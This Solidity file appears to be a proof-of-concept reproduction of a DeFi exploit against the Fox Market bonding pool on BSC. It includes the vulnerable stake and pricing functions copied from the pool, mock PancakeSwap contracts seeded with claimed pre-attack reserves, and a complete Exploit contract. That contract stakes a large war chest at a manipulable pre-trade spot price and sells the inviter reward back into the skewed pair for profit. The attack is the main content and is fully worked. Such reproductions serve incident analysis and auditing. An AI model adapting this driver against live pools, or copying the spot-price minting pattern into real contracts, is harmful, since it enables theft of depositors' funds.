// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// ─────────────────────────────────────────────────────────────────────────────
// Self-contained reproduction of the Fox Market exploit (BSC, 2026-08-15).
//
// Live: attacker drained the FoxLpBondsPool bonding pool for ~$118-120k after
// aggregating ~half a billion USDT of flash liquidity (Lista/Venus/Aave/Pancake),
// all repaid in the same block. Root cause confirmed by SlowMist / TenArmor /
// DefimonAlerts / ShiroCipher:
//   FoxLpBondsPool.stake() sizes the mint (stakeAmount) from a MANIPULABLE
//   Pancake AMM SPOT quote (getAmountsOut(1 FOX)) BEFORE executing its own large
//   USDT->FOX swap into that same pair. The mint (and the 3% liquid inviter FOX
//   reward) is frozen at the pre-trade price; the swap then skews reserves, and
//   the liquid inviter FOX is sold back into the now USDT-heavy / FOX-starved
//   curve for far more than the deposit.
//
// The vulnerable functions FoxLpBondsPool.getSwapPrice / FoxLpBondsPool.stake and
// Treasury.lpBonds are reproduced VERBATIM from the verified BSC source
// (impl 0x58E2A853…/0x87614D97…). The discount tap and off-chain log plumbing are
// simplified (discountRateTo == 0), and the surrounding upgradeable initializer
// is replaced with a plain setup — none of that is the bug. Pancake V2 is a
// faithful constant-product double (0.25% fee). The FOX/USDT pair is seeded with
// the real pre-attack reserves (2,786,697.20 USDT / 496,041.72 FOX).
// Local deploy, no fork.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
    function transferFrom(address from, address to, uint256 a) external returns (bool);
    function approve(address s, uint256 a) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// ── ERC20 with an authorized minter (FOX / sFOX / rFOX) ──
contract MintableERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; minter = msg.sender; }
    function setMinter(address m) external { require(msg.sender == minter, "!minter"); minter = m; }
    function mint(address to, uint256 a) external { require(msg.sender == minter, "!minter"); balanceOf[to] += a; totalSupply += a; }
    function approve(address sp, uint256 a) external returns (bool) { allowance[msg.sender][sp] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { _xfer(msg.sender, to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        _xfer(f, to, a); return true;
    }
    function _xfer(address f, address to, uint256 a) internal { balanceOf[f] -= a; balanceOf[to] += a; }
}

// ── Plain mintable stablecoin double (USDT, 18-dec on BSC) ──
contract MiniUSDT is IERC20 {
    string public name = "Tether USD"; string public symbol = "USDT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function approve(address sp, uint256 a) external returns (bool) { allowance[msg.sender][sp] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful PancakeSwap V2 constant-product double (0.25% fee).
// ─────────────────────────────────────────────────────────────────────────────
library Math {
    function min(uint256 a, uint256 b) internal pure returns (uint256) { return a < b ? a : b; }
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) { z = y; uint256 x = y / 2 + 1; while (x < z) { z = x; x = (y / x + x) / 2; } }
        else if (y != 0) { z = 1; }
    }
}

contract PancakePair is IERC20 {
    using Math for uint256;
    string public constant name = "Pancake LPs";
    string public constant symbol = "Cake-LP";
    uint8 public constant decimals = 18;
    uint256 public constant MINIMUM_LIQUIDITY = 1000;

    address public token0;
    address public token1;
    uint112 private reserve0;
    uint112 private reserve1;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function initialize(address _t0, address _t1) external { token0 = _t0; token1 = _t1; }
    function getReserves() public view returns (uint112 r0, uint112 r1, uint32 ts) { return (reserve0, reserve1, 0); }

    function approve(address sp, uint256 a) external returns (bool) { allowance[msg.sender][sp] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
    function _mint(address to, uint256 v) internal { totalSupply += v; balanceOf[to] += v; }
    function _burn(address from, uint256 v) internal { balanceOf[from] -= v; totalSupply -= v; }
    function _update(uint256 b0, uint256 b1) private { reserve0 = uint112(b0); reserve1 = uint112(b1); }

    function mint(address to) external returns (uint256 liquidity) {
        (uint112 r0, uint112 r1,) = getReserves();
        uint256 b0 = IERC20(token0).balanceOf(address(this));
        uint256 b1 = IERC20(token1).balanceOf(address(this));
        uint256 a0 = b0 - r0;
        uint256 a1 = b1 - r1;
        if (totalSupply == 0) { liquidity = Math.sqrt(a0 * a1) - MINIMUM_LIQUIDITY; _mint(address(0xdead), MINIMUM_LIQUIDITY); }
        else { liquidity = Math.min(a0 * totalSupply / r0, a1 * totalSupply / r1); }
        require(liquidity > 0, "ILM");
        _mint(to, liquidity);
        _update(b0, b1);
    }
    function burn(address to) external returns (uint256 a0, uint256 a1) {
        uint256 b0 = IERC20(token0).balanceOf(address(this));
        uint256 b1 = IERC20(token1).balanceOf(address(this));
        uint256 liq = balanceOf[address(this)];
        a0 = liq * b0 / totalSupply;
        a1 = liq * b1 / totalSupply;
        _burn(address(this), liq);
        IERC20(token0).transfer(to, a0);
        IERC20(token1).transfer(to, a1);
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)));
    }
    function swap(uint256 a0Out, uint256 a1Out, address to) external {
        (uint112 r0, uint112 r1,) = getReserves();
        require(a0Out < r0 && a1Out < r1, "IL");
        if (a0Out > 0) IERC20(token0).transfer(to, a0Out);
        if (a1Out > 0) IERC20(token1).transfer(to, a1Out);
        uint256 b0 = IERC20(token0).balanceOf(address(this));
        uint256 b1 = IERC20(token1).balanceOf(address(this));
        uint256 a0In = b0 > r0 - a0Out ? b0 - (r0 - a0Out) : 0;
        uint256 a1In = b1 > r1 - a1Out ? b1 - (r1 - a1Out) : 0;
        require(a0In > 0 || a1In > 0, "IIA");
        uint256 b0Adj = b0 * 10000 - a0In * 25; // 0.25% Pancake fee
        uint256 b1Adj = b1 * 10000 - a1In * 25;
        require(b0Adj * b1Adj >= uint256(r0) * r1 * (10000 ** 2), "K");
        _update(b0, b1);
    }
    // seed the pre-attack reserves via real first-mint semantics
    function seed() external returns (uint256 liquidity) {
        uint256 b0 = IERC20(token0).balanceOf(address(this));
        uint256 b1 = IERC20(token1).balanceOf(address(this));
        liquidity = Math.sqrt(b0 * b1) - MINIMUM_LIQUIDITY;
        _mint(address(0xdead), MINIMUM_LIQUIDITY);
        _mint(msg.sender, liquidity);
        _update(b0, b1);
    }
}

contract PancakeFactory {
    mapping(address => mapping(address => address)) public getPair;
    function createPair(address a, address b) external returns (address pair) {
        (address t0, address t1) = a < b ? (a, b) : (b, a);
        PancakePair p = new PancakePair();
        p.initialize(t0, t1);
        pair = address(p);
        getPair[a][b] = pair;
        getPair[b][a] = pair;
    }
}

contract PancakeRouter {
    address public factory;
    constructor(address _f) { factory = _f; }

    function getAmountOut(uint256 amtIn, uint256 rIn, uint256 rOut) public pure returns (uint256) {
        uint256 amtInFee = amtIn * 9975;
        return (amtInFee * rOut) / (rIn * 10000 + amtInFee);
    }
    function _reserves(address pair, address tin) internal view returns (uint256 rIn, uint256 rOut) {
        (uint112 r0, uint112 r1,) = PancakePair(pair).getReserves();
        address t0 = PancakePair(pair).token0();
        (rIn, rOut) = tin == t0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
    }
    function getAmountsOut(uint256 amtIn, address[] memory path) public view returns (uint256[] memory amounts) {
        amounts = new uint256[](path.length);
        amounts[0] = amtIn;
        for (uint256 i = 0; i < path.length - 1; i++) {
            address pair = PancakeFactory(factory).getPair(path[i], path[i + 1]);
            (uint256 rIn, uint256 rOut) = _reserves(pair, path[i]);
            amounts[i + 1] = getAmountOut(amounts[i], rIn, rOut);
        }
    }
    function swapExactTokensForTokens(uint256 amtIn, uint256 amtOutMin, address[] calldata path, address to, uint256)
        external returns (uint256[] memory amounts)
    {
        amounts = getAmountsOut(amtIn, path);
        require(amounts[amounts.length - 1] >= amtOutMin, "INSUFFICIENT_OUTPUT");
        address pair = PancakeFactory(factory).getPair(path[0], path[1]);
        IERC20(path[0]).transferFrom(msg.sender, pair, amtIn);
        address t0 = PancakePair(pair).token0();
        (uint256 a0Out, uint256 a1Out) = path[0] == t0 ? (uint256(0), amounts[1]) : (amounts[1], uint256(0));
        PancakePair(pair).swap(a0Out, a1Out, to);
    }
    function _quote(uint256 amtA, uint256 rA, uint256 rB) internal pure returns (uint256) { return amtA * rB / rA; }
    function _optimal(address pair, address tokenA, uint256 amtADesired, uint256 amtBDesired)
        internal view returns (uint256 amtA, uint256 amtB)
    {
        (uint256 rA, uint256 rB) = _reserves(pair, tokenA);
        if (rA == 0 && rB == 0) return (amtADesired, amtBDesired);
        uint256 amtBOpt = _quote(amtADesired, rA, rB);
        if (amtBOpt <= amtBDesired) return (amtADesired, amtBOpt);
        return (_quote(amtBDesired, rB, rA), amtBDesired);
    }
    function addLiquidity(
        address tokenA, address tokenB, uint256 amtADesired, uint256 amtBDesired,
        uint256, uint256, address to, uint256
    ) external returns (uint256 amtA, uint256 amtB, uint256 liquidity) {
        address pair = PancakeFactory(factory).getPair(tokenA, tokenB);
        (amtA, amtB) = _optimal(pair, tokenA, amtADesired, amtBDesired);
        IERC20(tokenA).transferFrom(msg.sender, pair, amtA);
        IERC20(tokenB).transferFrom(msg.sender, pair, amtB);
        liquidity = PancakePair(pair).mint(to);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Off-chain plumbing doubles (referral tree + stake-id log). Not the bug.
// ─────────────────────────────────────────────────────────────────────────────
contract Referral {
    mapping(address => address) public referralMap;
    function setReferral(address staker, address inviter) external { referralMap[staker] = inviter; }
}
contract Log {
    uint256 public count;
    function getBlockIdListCount() external view returns (uint256) { return count; }
    function addBlockId() external { count++; }
}

// ─────────────────────────────────────────────────────────────────────────────
// Treasury — lpBonds reproduced VERBATIM (the minter that trusts the pool's
// pre-trade _stakeAmount and pays the liquid inviter FOX in the same call).
// ─────────────────────────────────────────────────────────────────────────────
contract Treasury {
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public constant BASE_100 = 10000;
    uint256 public constant REWARD_RATIO = 1100;

    address public foxToken;
    address public stakedFoxToken;
    address public rewardFoxToken;
    address public lpFoxToken;
    address public foxDistributor;
    address public stakingPool;

    function init(address _fox, address _sfox, address _rfox, address _lpFox, address _dist, address _pool) external {
        foxToken = _fox; stakedFoxToken = _sfox; rewardFoxToken = _rfox; lpFoxToken = _lpFox; foxDistributor = _dist; stakingPool = _pool;
    }
    modifier onlyStakingPool() { require(msg.sender == stakingPool, "!pool"); _; }

    // ── VERBATIM Treasury.lpBonds ──
    function lpBonds(uint256 _lpFoxAmount, uint256 _stakeAmount, uint256 _stakeDays, address inviterAddress, uint256 inviterRewardAmount) external onlyStakingPool {
        IERC20(lpFoxToken).transferFrom(msg.sender, DEAD, _lpFoxAmount);
        MintableERC20(foxToken).mint(address(this), _stakeAmount + inviterRewardAmount);
        MintableERC20(stakedFoxToken).mint(msg.sender, _stakeAmount);
        if (_stakeDays >= 180) {
            MintableERC20(rewardFoxToken).mint(foxDistributor, _stakeAmount * REWARD_RATIO / BASE_100);
        }
        if (inviterRewardAmount > 0) {
            IERC20(foxToken).transfer(inviterAddress, inviterRewardAmount);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FoxLpBondsPool — getSwapPrice + stake reproduced VERBATIM (the @> VULN line is
// the mint sized from the pre-trade spot quote). The upgradeable initializer is
// replaced by a plain setup(); discountRateTo == 0 so the discount tap is skipped.
// ─────────────────────────────────────────────────────────────────────────────
contract FoxLpBondsPool {
    uint256 public constant MIN_AMOUNT = 100 * 1e18;
    uint256 public constant INVITER_REWARD_RATIO = 300;
    uint256 public constant INVITER_REWARD_MIN_AMOUNT = 1000 * 1e18;
    uint256 public constant BASE_100 = 10000;
    uint256 public constant TIME_BASE = 1 days;

    address public treasury;
    address public referralAddress;
    address public logAddress;
    address public usdtToken;
    address public foxToken;
    address public stakedFoxToken;
    address public lpFoxToken;
    address public swapRouter;
    uint256 public stakeDays;
    uint256 public discountRateTo; // 0 -> discount skipped (not the bug)

    address[] public usdtToFoxPath;
    address[] public foxToUsdtPath;

    struct StakeInfo { uint256 stakeId; address user; uint256 amount; }
    mapping(uint256 => StakeInfo) public stakeInfoMap;

    function setup(
        address _treasury, address _referral, address _log, address _usdt, address _fox,
        address _sfox, address _lpFox, address _router, uint256 _stakeDays
    ) external {
        treasury = _treasury; referralAddress = _referral; logAddress = _log;
        usdtToken = _usdt; foxToken = _fox; stakedFoxToken = _sfox; lpFoxToken = _lpFox;
        swapRouter = _router; stakeDays = _stakeDays;
        usdtToFoxPath.push(_usdt); usdtToFoxPath.push(_fox);
        foxToUsdtPath.push(_fox); foxToUsdtPath.push(_usdt);
        IERC20(_usdt).approve(_router, type(uint256).max);
        IERC20(_fox).approve(_router, type(uint256).max);
        IERC20(_sfox).approve(_treasury, type(uint256).max);
        IERC20(_lpFox).approve(_treasury, type(uint256).max);
    }

    // ── VERBATIM getSwapPrice (spot read of the FOX/USDT pair) ──
    function getSwapPrice(uint256 _timestamp) public view returns (uint256, uint256) {
        if (_timestamp == 0) {
            _timestamp = block.timestamp / TIME_BASE * TIME_BASE;
        }
        uint256[] memory amountsOut = PancakeRouter(swapRouter).getAmountsOut(1e18, foxToUsdtPath); // @> VULN: single-block spot read of the FOX/USDT pair reserves used as the pricing oracle
        uint256 swapPrice = amountsOut[1];
        if (discountRateTo > 0) {
            // discount tap omitted in this reproduction (discountRateTo == 0)
        }
        return (swapPrice, amountsOut[1]);
    }

    // ── VERBATIM stake (quote-then-trade; mint frozen at the pre-trade price) ──
    function stake(uint256 _usdtAmount, uint256 _swapPrice) external {
        require(_usdtAmount >= MIN_AMOUNT, "usdtAmount invalid");
        address inviterAddress = Referral(referralAddress).referralMap(msg.sender);
        require(inviterAddress != address(0), "no referral");

        IERC20(usdtToken).transferFrom(msg.sender, address(this), _usdtAmount);
        _usdtAmount = IERC20(usdtToken).balanceOf(address(this));

        uint256 startTime = block.timestamp / TIME_BASE * TIME_BASE;

        (uint256 swapPrice, ) = getSwapPrice(startTime);
        if (swapPrice > _swapPrice) {
            require((swapPrice - _swapPrice) * BASE_100 / _swapPrice <= 100, "swapPrice invalid");
        }

        uint256 stakeAmount = _usdtAmount * 1e18 / swapPrice; // @> VULN: mint sized from the PRE-trade spot quote — the swap below empties the FOX side, but stakeAmount (and the 3% liquid inviter FOX) is already frozen at the old price

        PancakeRouter(swapRouter).swapExactTokensForTokens(_usdtAmount / 2, 0, usdtToFoxPath, address(this), block.timestamp);

        uint256 usdtBalance = IERC20(usdtToken).balanceOf(address(this));
        uint256 foxBalance = IERC20(foxToken).balanceOf(address(this));
        (, , uint256 liquidity) = PancakeRouter(swapRouter).addLiquidity(usdtToken, foxToken, usdtBalance, foxBalance, 0, 0, address(this), block.timestamp);

        usdtBalance = IERC20(usdtToken).balanceOf(address(this));
        if (usdtBalance > 0) {
            IERC20(usdtToken).transfer(msg.sender, usdtBalance);
        }

        uint256 inviterRewardAmount = 0;
        if (stakeDays >= 180 && _usdtAmount >= INVITER_REWARD_MIN_AMOUNT) {
            inviterRewardAmount = stakeAmount * INVITER_REWARD_RATIO / BASE_100;
        }

        Treasury(treasury).lpBonds(liquidity, stakeAmount, stakeDays, inviterAddress, inviterRewardAmount);

        uint256 stakeId = Log(logAddress).getBlockIdListCount();
        Log(logAddress).addBlockId();
        stakeInfoMap[stakeId] = StakeInfo({ stakeId: stakeId, user: msg.sender, amount: stakeAmount });
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: seed a war chest, deposit it through the vulnerable bond,
// then sell the liquid 3% inviter FOX back into the reserve-smashed pair.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // real pre-attack FOX/USDT reserves
    uint256 internal constant USDT_RESERVE = 2786697198864505157273333; // 2,786,697.20 USDT
    uint256 internal constant FOX_RESERVE  = 496041716814196640205248;  // 496,041.72 FOX
    uint256 internal constant WAR_CHEST    = 450000000000000000000000000; // 450,000,000 USDT
    uint256 internal constant STAKE_DAYS   = 540;

    MiniUSDT public usdt;            // n1  (profit token)
    MintableERC20 public fox;        // n2
    MintableERC20 public sfox;       // n3
    MintableERC20 public rfox;       // n4
    Referral public referral;        // n5
    Log public log;                  // n6
    PancakeFactory public factory;   // n7
    PancakeRouter public router;     // n8
    Treasury public treasury;        // n9
    FoxLpBondsPool public pool;      // n10 (VULN)
    address public pair;

    uint256 public warChest;
    uint256 public inviterFox;
    uint256 public usdtOut;
    uint256 public profit;

    constructor() {
        usdt = new MiniUSDT();                       // n1
        fox = new MintableERC20("Fox", "FOX");       // n2  (minter = this, until handed to treasury)
        sfox = new MintableERC20("Staked Fox", "sFOX"); // n3
        rfox = new MintableERC20("Reward Fox", "rFOX"); // n4
        referral = new Referral();                   // n5
        log = new Log();                             // n6
        factory = new PancakeFactory();              // n7
        router = new PancakeRouter(address(factory)); // n8
        treasury = new Treasury();                   // n9
        pool = new FoxLpBondsPool();                 // n10 (VULN)

        // ---- lpFox token is the FOX/USDT LP (the pair itself) ----
        pair = factory.createPair(address(usdt), address(fox));

        // ---- seed the FOX/USDT pair with the real pre-attack reserves ----
        //      (done while THIS contract is still the FOX minter)
        usdt.mint(pair, USDT_RESERVE);
        fox.mint(pair, FOX_RESERVE);
        PancakePair(pair).seed();

        // ---- hand FOX/sFOX/rFOX minting to the Treasury (as on-chain) ----
        fox.setMinter(address(treasury));
        sfox.setMinter(address(treasury));
        rfox.setMinter(address(treasury));

        treasury.init(address(fox), address(sfox), address(rfox), pair, address(0xdead1), address(pool));
        pool.setup(address(treasury), address(referral), address(log), address(usdt), address(fox), address(sfox), pair, address(router), STAKE_DAYS);

        // ---- referral binding: staker == inviter == this exploit ----
        referral.setReferral(address(this), address(this));

        // ---- war chest (live: ~half a billion flash-loaned & repaid same block) ----
        warChest = WAR_CHEST;
        usdt.mint(address(this), warChest);
        usdt.approve(address(router), type(uint256).max);
        fox.approve(address(router), type(uint256).max);
    }

    function run() external {
        // approve the pool to pull the war chest
        usdt.approve(address(pool), type(uint256).max);

        uint256 usdtBefore = usdt.balanceOf(address(this));

        // ---- deposit the whole war chest through the vulnerable bond ----
        (uint256 sp, ) = pool.getSwapPrice(0);
        pool.stake(warChest, sp);

        // ---- the 3% liquid inviter FOX, minted at the PRE-trade price, is now ours ----
        inviterFox = fox.balanceOf(address(this));

        // ---- sell it back into the reserve-smashed (USDT-rich / FOX-starved) pair ----
        address[] memory foxToUsdt = new address[](2);
        foxToUsdt[0] = address(fox);
        foxToUsdt[1] = address(usdt);
        router.swapExactTokensForTokens(inviterFox, 0, foxToUsdt, address(this), block.timestamp);

        uint256 usdtAfter = usdt.balanceOf(address(this));
        usdtOut = usdtAfter;
        require(usdtAfter > usdtBefore, "no profit");
        profit = usdtAfter - usdtBefore;
    }
}
